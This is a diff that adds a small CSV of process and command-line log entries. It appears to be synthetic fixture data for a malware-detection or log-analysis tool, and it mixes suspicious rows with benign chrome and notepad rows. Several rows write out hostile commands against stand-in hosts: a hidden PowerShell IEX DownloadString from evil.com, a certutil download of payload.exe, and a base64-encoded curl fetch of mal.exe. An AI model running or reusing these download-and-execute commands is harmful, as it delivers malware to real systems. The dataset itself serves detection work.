@@ -1,0 +1,12 @@
+timestamp,process,parent_process,command_line,ip,destination_port,user_agent
+2026-03-30 10:00:00,winword.exe,explorer.exe,open invoice.docm,192.168.1.10,0,chrome
+2026-03-30 10:00:10,powershell.exe,winword.exe,powershell -enc aW52b2tlLXdlYnJlcXVlc3Q=,8.8.8.8,443,python-requests
+2026-03-30 10:00:20,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJMIGh0dHA6Ly9ldmlsLmNvbS9tYWwuZXhl,45.33.32.156,80,curl
+2026-03-30 10:00:30,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 10:00:40,evil.exe,powershell.exe,C:\Users\Public\evil.exe,45.33.32.156,4444,unknown
+2026-03-30 11:00:00,unknown_tool.exe,explorer.exe,C:\temp\randomtool.exe --silent --connect http://weird-domain.com/file.exe,34.120.55.1,443,curl
+2026-03-30 11:00:10,cmd.exe,explorer.exe,cmd /c powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')",52.23.11.9,80,winhttp
+2026-03-30 11:00:20,weird.exe,cmd.exe,weird.exe --very-long-command-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,18.22.33.44,8080,unknown
+2026-03-30 12:00:00,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.5,0,chrome
+2026-03-30 12:00:10,notepad.exe,explorer.exe,notepad file.txt,192.168.1.5,0,none
+2026-03-30 12:00:20,explorer.exe,system,open folder documents,192.168.1.5,0,none
